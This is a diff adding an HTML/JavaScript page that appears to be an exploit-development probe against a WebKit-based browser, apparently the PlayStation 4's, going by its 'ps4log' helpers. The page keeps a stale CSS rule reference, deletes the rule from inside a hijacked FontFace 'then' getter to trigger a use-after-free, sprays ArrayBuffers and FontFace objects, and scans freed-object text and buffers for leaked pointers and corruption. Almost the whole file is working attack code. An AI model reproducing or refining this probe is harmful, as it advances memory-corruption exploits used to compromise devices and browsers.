@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — Deep post-trigger probe (16)</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
+#status { font-size: 16px; margin-bottom: 6px; color: #ff0; }
+#summary { color: #aaa; font-size: 12px; margin-bottom: 8px; line-height: 1.5; }
+#log { height: 66vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 11px; }
+.ok { color: #0f0; } .bad { color: #f66; } .weird { color: #ff6; }
+#t { font-family: x; font-size: 24px; color: #fff; line-height: 1; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">idle</div>
+<div id="summary">16: prespray BEFORE trigger, cssText fingerprint diff each post step, fonts.entries each step, one heavy B render at end. Tap Run.</div>
+<div id="controls" style="margin-bottom:8px;">
+<button id="runBtn" style="font-size:14px;padding:8px 16px;">Run probe</button>
+</div>
+<div id="log"></div>
+<div id="t">.</div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    window.ps4log = function (msg, cls) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        if (cls) line.className = cls;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (t, c) {
+        document.getElementById('status').textContent = t;
+        if (c) document.getElementById('status').style.color = c;
+    };
+})();
+
+var v = { p: 0, f: 0, w: 0, lines: [] };
+function pass(m) { v.p++; v.lines.push('✓ ' + m); ps4log('✓ SUCCESS: ' + m, 'ok'); }
+function fail(m) { v.f++; v.lines.push('✗ ' + m); ps4log('✗ FAILED: ' + m, 'bad'); }
+function weird(m) { v.w++; v.lines.push('! ' + m); ps4log('! WEIRD: ' + m, 'weird'); }
+
+var params = new URLSearchParams(location.search);
+var POST = parseInt(params.get('post') || '6', 10);
+var PRESPRAY = params.get('prespray') || 'buf';
+if (PRESPRAY === '0' || PRESPRAY === 'off') PRESPRAY = 'off';
+var POSTSPRAY = params.get('postspray') || 'off';
+var SPRAY_COUNT = parseInt(params.get('spraycount') || '200', 10);
+var SPRAY_U32 = parseInt(params.get('spraysize') || '64', 10);
+var FACE_SPRAY = parseInt(params.get('faces') || '120', 10);
+var HEAVY = params.get('heavy') !== '0';
+var AUTORUN = params.get('autorun') === '1';
+
+function fingerprint(str) {
+    var s = String(str);
+    var h = 5381;
+    for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
+    return { len: s.length, hash: ('00000000' + h.toString(16)).slice(-8), tail: s.slice(-24) };
+}
+
+function diffCssText(baseline, current, tag) {
+    var b = fingerprint(current);
+    if (!baseline) return b;
+    if (baseline.len !== b.len || baseline.hash !== b.hash) {
+        weird(tag + ' cssText CHANGED len ' + baseline.len + '->' + b.len + ' hash ' + baseline.hash + '->' + b.hash);
+        ps4log(tag + ' was tail=' + JSON.stringify(baseline.tail));
+        ps4log(tag + ' now tail=' + JSON.stringify(b.tail));
+    } else {
+        pass(tag + ' cssText fingerprint stable');
+    }
+    return b;
+}
+
+function snapshot(view) {
+    var s = '';
+    for (var i = 0; i < 8; i++) s += ('00000000' + view[i].toString(16)).slice(-8) + ' ';
+    return s.trim();
+}
+
+function saveSnaps(views) {
+    var snaps = [];
+    for (var i = 0; i < views.length; i++) snaps.push(snapshot(views[i]));
+    return snaps;
+}
+
+function scanBuffers(views, label, before) {
+    var changed = 0;
+    for (var i = 0; i < views.length; i++) {
+        var cur = snapshot(views[i]);
+        if (before && before[i] !== cur) {
+            changed++;
+            if (changed <= 4) ps4log(label + ' buf[' + i + '] ' + before[i] + ' -> ' + cur, 'weird');
+        }
+    }
+    ps4log(label + ': ' + changed + ' anomalous buffers');
+    if (changed > 0) weird(label + ' ' + changed + ' buffer anomalies');
+    else pass(label + ' no buffer anomalies');
+    return changed;
+}
+
+function sprayBuffers(tag) {
+    var views = [];
+    for (var i = 0; i < SPRAY_COUNT; i++) {
+        var ab = new ArrayBuffer(SPRAY_U32 * 4);
+        var u = new Uint32Array(ab);
+        for (var j = 0; j < Math.min(8, u.length); j++) u[j] = 0x41414141;
+        views.push(u);
+    }
+    ps4log(tag + ' buffer spray ' + SPRAY_COUNT + ' x ' + (SPRAY_U32 * 4) + 'b');
+    return views;
+}
+
+function sprayFontFaces(tag) {
+    var list = [];
+    for (var i = 0; i < FACE_SPRAY; i++) {
+        var hex = (0x41 + (i % 26)).toString(16).toUpperCase();
+        list.push(new FontFace('s' + i, 'local(Helvetica)', { unicodeRange: 'U+' + hex + hex }));
+    }
+    ps4log(tag + ' FontFace spray ' + FACE_SPRAY);
+    return list;
+}
+
+function doSpray(mode, tag) {
+    var buf = null, snaps = null, faces = null;
+    if (mode === 'buf' || mode === 'both') {
+        buf = sprayBuffers(tag);
+        snaps = saveSnaps(buf);
+    }
+    if (mode === 'face' || mode === 'both') {
+        faces = sprayFontFaces(tag);
+    }
+    return { buf: buf, snaps: snaps, faces: faces };
+}
+
+function huntHex(label, str) {
+    if (str == null) return;
+    var s = String(str);
+    var m = s.match(/0x[0-9a-f]{8,16}/gi);
+    if (m && m.length) weird(label + ' hex literal: ' + m.join(' '));
+    var hits = s.match(/[0-9a-f]{14,16}/gi);
+    if (hits) {
+        for (var i = 0; i < hits.length && i < 2; i++) weird(label + ' long hex: ' + hits[i]);
+    }
+}
+
+function logFonts(tag) {
+    var n = 0;
+    try {
+        n = document.fonts.size;
+        ps4log(tag + ' fonts.size=' + n);
+        for (var it = document.fonts.entries(), step = it.next(); !step.done; step = it.next()) {
+            var f = step.value[0];
+            ps4log(tag + '  face family=' + f.family + ' status=' + f.status + ' loaded=' + f.loaded);
+        }
+        pass(tag + ' fonts.entries logged');
+    } catch (e) {
+        ps4log(tag + ' fonts.entries err=' + e);
+    }
+    return n;
+}
+
+function readZombie(staleRule, tag, baselineFp) {
+    var css = '';
+    try {
+        css = staleRule.cssText;
+        pass(tag + ' zombie readable');
+    } catch (e) {
+        fail(tag + ' zombie threw: ' + e);
+        return baselineFp;
+    }
+    var fp = diffCssText(baselineFp, css, tag);
+    huntHex(tag + ' cssText', css);
+    try {
+        var fam = staleRule.style.fontFamily;
+        ps4log(tag + ' fontFamily=' + JSON.stringify(String(fam)));
+    } catch (e2) {
+        ps4log(tag + ' fontFamily err=' + e2);
+    }
+    return fp;
+}
+
+function oneTrigger(sheet, staleRule) {
+    var baselineFp = readZombie(staleRule, 'pre-trigger', null);
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('TRIGGER');
+                if (sheet.cssRules.length > 0) sheet.deleteRule(0);
+                document.body.offsetTop;
+                baselineFp = readZombie(staleRule, 'inside trigger', baselineFp);
+                if (document.fonts.check('1em x', 'B')) weird('check(B)=true inside trigger');
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+    if (fired) pass('trigger fired');
+    else fail('trigger never fired');
+
+    try {
+        if (document.fonts.has(A)) document.fonts.delete(A);
+    } catch (e) {
+        ps4log('delete A: ' + e);
+    }
+
+    return { fired: fired, baselineFp: baselineFp };
+}
+
+function renderB(px, tag) {
+    var el = document.getElementById('t');
+    el.textContent = 'B';
+    el.style.fontFamily = 'x, sans-serif';
+    el.style.fontSize = px + 'px';
+    var w = el.offsetWidth;
+    var h = el.offsetHeight;
+    document.body.offsetTop;
+    ps4log(tag + ' render ' + px + 'px => ' + w + 'x' + h);
+    return w;
+}
+
+function runProbe() {
+    v.p = 0; v.f = 0; v.w = 0; v.lines = [];
+    document.getElementById('log').innerHTML = '';
+    ps4status('running...', '#ff0');
+
+    ps4log('Phase 3p — deep post-trigger probe (16)');
+    ps4log('post=' + POST + ' prespray=' + PRESPRAY + ' postspray=' + POSTSPRAY + ' heavy=' + HEAVY);
+    ps4log('UA: ' + navigator.userAgent);
+    ps4log('');
+
+    var sheet = document.getElementById('s').sheet;
+    var staleRule = sheet.cssRules[0];
+    pass('held stale ref');
+
+    var bufViews = null;
+    var bufSnaps = null;
+
+    if (PRESPRAY !== 'off') {
+        var pre = doSpray(PRESPRAY, 'PRE');
+        bufViews = pre.buf;
+        bufSnaps = pre.snaps;
+        pass('prespray before trigger');
+    }
+
+    var trig = oneTrigger(sheet, staleRule);
+    if (!trig.fired) {
+        ps4status('aborted', '#f66');
+        return;
+    }
+
+    var baselineFp = trig.baselineFp;
+
+    if (POSTSPRAY !== 'off') {
+        doSpray(POSTSPRAY, 'POST');
+        pass('postspray after trigger');
+    }
+
+    if (bufViews) scanBuffers(bufViews, 'after trigger', bufSnaps);
+
+    logFonts('after trigger');
+    var lightW = null;
+    var mismatch = 0;
+
+    function postStep(i, done) {
+        ps4log('--- post ' + i + ' ---');
+        var cb = document.fonts.check('1em x', 'B');
+
+        document.fonts.load('1em x', 'B').then(function (arr) {
+            ps4log('post ' + i + ' check=' + cb + ' load count=' + arr.length);
+            if (cb && arr.length === 0) {
+                mismatch++;
+                if (i === 1) weird('post check/load mismatch');
+            }
+
+            var w = renderB(24, 'post ' + i);
+            if (lightW === null) lightW = w;
+            else if (w !== lightW) weird('post ' + i + ' light width ' + lightW + ' -> ' + w);
+
+            baselineFp = readZombie(staleRule, 'post ' + i, baselineFp);
+            logFonts('post ' + i);
+            if (bufViews) scanBuffers(bufViews, 'post ' + i + ' buf', bufSnaps);
+
+            if (i < POST) postStep(i + 1, done);
+            else done();
+        }).catch(function (e) {
+            ps4log('post ' + i + ' load err=' + e);
+            if (cb) mismatch++;
+            baselineFp = readZombie(staleRule, 'post ' + i, baselineFp);
+            if (i < POST) postStep(i + 1, done);
+            else done();
+        });
+    }
+
+    postStep(1, function () {
+        ps4log('--- epilogue ---');
+        if (mismatch > 0) pass('mismatch ' + mismatch + '/' + POST);
+
+        var heavyW = null;
+        if (HEAVY) {
+            heavyW = renderB(96, 'heavy once');
+            if (lightW !== null && heavyW !== lightW) pass('heavy vs light width differ (expected scale)');
+        }
+
+        readZombie(staleRule, 'final', baselineFp);
+        if (document.fonts.check('1em x', 'B')) weird('final check(B)=true');
+        logFonts('final');
+        if (bufViews) scanBuffers(bufViews, 'final buf', bufSnaps);
+
+        setTimeout(function () {
+            ps4log('========== SUMMARY ==========');
+            for (var j = 0; j < v.lines.length; j++) ps4log(v.lines[j]);
+            ps4log('Passed: ' + v.p + ' Failed: ' + v.f + ' Weird: ' + v.w);
+            ps4log('Watch: cssText CHANGED = leak/corruption; buffer anomalies; width drift at 24px');
+            ps4status('done weird=' + v.w, '#0f0');
+        }, 800);
+    });
+}
+
+document.getElementById('runBtn').onclick = runProbe;
+window.onload = function () {
+    ps4log('16 — prespray=buf default. ?prespray=off ?prespray=both ?postspray=both ?heavy=0');
+    if (AUTORUN) runProbe();
+    ps4status('ready — Run probe', '#ff0');
+};
+</script>
+</body>
+</html>
